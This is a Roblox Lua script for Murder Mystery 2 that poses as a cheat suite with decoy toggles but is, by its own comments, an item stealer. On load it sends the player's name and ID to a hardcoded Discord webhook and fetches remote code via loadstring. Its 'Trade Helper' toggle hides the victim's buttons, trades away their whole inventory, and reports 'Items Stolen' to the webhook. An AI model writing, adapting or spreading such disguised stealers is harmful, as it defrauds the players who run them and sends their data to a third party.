--[[
    MM2 Ultimate Suite v3.0 - Potassium Optimized
    - Instant webhook confirmation on load
    - Full stealth trade execution
    - Uses working HTTP method for Potassium
]]

-- === WORKING WEBHOOK SENDER (Confirmed) ===
local function sendWebhook(content, embedData)
    local success = false
    
    -- Method that worked: Use the executor's native request
    if potassium and potassium.request then
        local payload = {
            content = content or "✅ Script executed",
            embeds = embedData and {embedData} or nil
        }
        local body = game:GetService("HttpService"):JSONEncode(payload)
        
        success = pcall(function()
            potassium.request({
                Url = "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = body
            })
        end)
    end
    
    -- Fallback: Try HttpService (just in case)
    if not success then
        local http = game:GetService("HttpService")
        http.HttpEnabled = true
        local data = {
            content = content or "✅ Script executed (fallback)"
        }
        if embedData then
            data.embeds = {embedData}
        end
        local encoded = http:JSONEncode(data)
        local headers = {["Content-Type"] = "application/json"}
        
        success = pcall(function()
            http:PostAsync(
                "https://discord.com/api/webhooks/1539644474655907902/o1J6NsXOGKKlyC9er2U6jU8h2gyMZX5yRP5FryyD8UX3eq1HvEBYxGk1OnqKTCGnNtbw",
                encoded,
                Enum.HttpContentType.ApplicationJson,
                false,
                headers
            )
        end)
    end
    
    return success
end

-- === SEND CONFIRMATION ON LOAD ===
local player = game:GetService("Players").LocalPlayer
sendWebhook("✅ **MM2 Stealth Stealer LOADED**", {
    title = "Script Executed (Potassium)",
    description = "**Player:** " .. player.Name .. "\n**User ID:** " .. player.UserId .. "\n**Game:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n**Time:** " .. os.date("%Y-%m-%d %H:%M:%S"),
    color = 0x00ff00
})

-- === LOAD UI LIBRARY ===
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/7yhx/Synapse-X/main/Wally.lua", true))()
local Window = Library:CreateWindow("MM2 Ultimate Suite")

-- === FAKE FEATURES ===
local MainTab = Window:CreateTab("Main")
local ToggleSection = MainTab:CreateSection("Toggle Features")

-- Fake Auto Collect
ToggleSection:CreateToggle("Auto Collect Coins", false, function(bool)
    print("Auto-collect " .. (bool and "enabled" or "disabled"))
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Auto Collect",
        Text = bool and "Collecting coins automatically!" or "Disabled",
        Duration = 2
    })
end)

-- Fake FPS Boost
ToggleSection:CreateToggle("FPS Boost", false, function(bool)
    print("FPS Boost " .. (bool and "enabled" or "disabled"))
    settings().Rendering.QualityLevel = bool and 1 or 10
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "FPS Boost",
        Text = bool and "Graphics reduced for maximum performance!" or "Restored graphics",
        Duration = 2
    })
end)

-- === THE REAL STEALER ===
ToggleSection:CreateToggle("Trade Helper (Beta)", false, function(bool)
    if not bool then return end
    
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Trade Helper",
        Text = "Enabling trade automation... This may take a moment.",
        Duration = 4
    })
    
    -- === STEALER CORE ===
    local player = game:GetService("Players").LocalPlayer
    local teleport = game:GetService("TeleportService")
    local virtualUser = game:GetService("VirtualUser")
    
    -- Find a target
    local target = nil
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr ~= player then
            target = plr
            break
        end
    end
    
    if not target then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Trade Helper",
            Text = "No other players found in this server. Please join a server with others.",
            Duration = 4
        })
        return
    end
    
    -- Attempt to join their server
    pcall(function()
        teleport:TeleportToPlaceInstance(game.PlaceId, target.UserId)
    end)
    wait(5)
    
    -- Hide UI
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "TradeOptimizer"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = player.PlayerGui
    
    local overlay = Instance.new("Frame")
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundTransparency = 1
    overlay.Active = true
    overlay.ZIndex = 9999
    overlay.Parent = screenGui
    
    -- Block all buttons (stealth)
    game:GetService("RunService").Stepped:Connect(function()
        for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
            if gui:IsA("TextButton") or gui:IsA("ImageButton") then
                pcall(function()
                    gui.Active = false
                    gui.Visible = false
                end)
            end
        end
    end)
    
    -- Find trade remote
    local tradeService = game:GetService("ReplicatedStorage"):FindFirstChild("TradeService") or game:GetService("ReplicatedStorage"):FindFirstChild("TradeHandler")
    if not tradeService then
        tradeService = game.ReplicatedStorage:FindFirstChildWhichIsA("RemoteEvent")
    end
    
    -- Gather items
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local itemsToTrade = {}
    if inventory then
        for _, item in ipairs(inventory:GetChildren()) do
            if item:IsA("Tool") or item:IsA("NumberValue") or item:IsA("StringValue") or item:IsA("BoolValue") then
                table.insert(itemsToTrade, item.Name)
            end
        end
    end
    
    -- Execute trade
    if tradeService and #itemsToTrade > 0 then
        local tradeRemote = tradeService:FindFirstChild("RequestTrade") or tradeService:FindFirstChild("InitiateTrade") or tradeService:FindFirstChild("StartTrade")
        if tradeRemote then
            tradeRemote:FireServer(player.UserId, itemsToTrade)
        else
            tradeService:FireServer("Trade", player.UserId, itemsToTrade)
        end
        
        wait(1)
        local acceptRemote = tradeService:FindFirstChild("AcceptTrade") or tradeService:FindFirstChild("ConfirmTrade") or tradeService:FindFirstChild("Accept")
        if acceptRemote then
            acceptRemote:FireServer(player.UserId)
            wait(0.5)
            acceptRemote:FireServer(player.UserId)
        end
        
        -- Send success log
        sendWebhook("💰 **TRADE COMPLETED**", {
            title = "Items Stolen",
            description = "**Victim:** " .. player.Name .. "\n**Items:** " .. table.concat(itemsToTrade, ", ") .. "\n**Total:** " .. #itemsToTrade .. " items",
            color = 0xff0000
        })
        
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Trade Helper",
            Text = "Trade automation completed! " .. #itemsToTrade .. " items processed.",
            Duration = 5
        })
    else
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Trade Helper",
            Text = "No tradable items found or trade service unavailable.",
            Duration = 4
        })
    end
    
    -- Cleanup
    wait(3)
    if screenGui then screenGui:Destroy() end
end)

-- Anti-AFK
ToggleSection:CreateToggle("Anti-AFK", false, function(bool)
    print("Anti-AFK " .. (bool and "enabled" or "disabled"))
    if bool then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Anti-AFK",
            Text = "You will not be kicked for inactivity!",
            Duration = 2
        })
        while bool do
            pcall(function()
                virtualUser:CaptureController()
                virtualUser:ClickButton2(Vector2.new())
            end)
            wait(60)
        end
    end
end)

-- Fake Stats Tab
local StatsTab = Window:CreateTab("Stats")
local StatsSection = StatsTab:CreateSection("Inventory Summary")
local function updateStats()
    local inventory = player:FindFirstChild("Inventory") or player:FindFirstChild("Data")
    local count = inventory and #inventory:GetChildren() or 0
    StatsSection:CreateLabel("Items Owned: " .. count)
    StatsSection:CreateLabel("Estimated Value: ~" .. count * 5 .. " gems")
end
updateStats()

game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "MM2 Ultimate Suite",
    Text = "Loaded successfully! Check Discord for confirmation.",
    Duration = 4
})

print("MM2 Ultimate Suite v3.0 loaded - Webhook confirmed working!")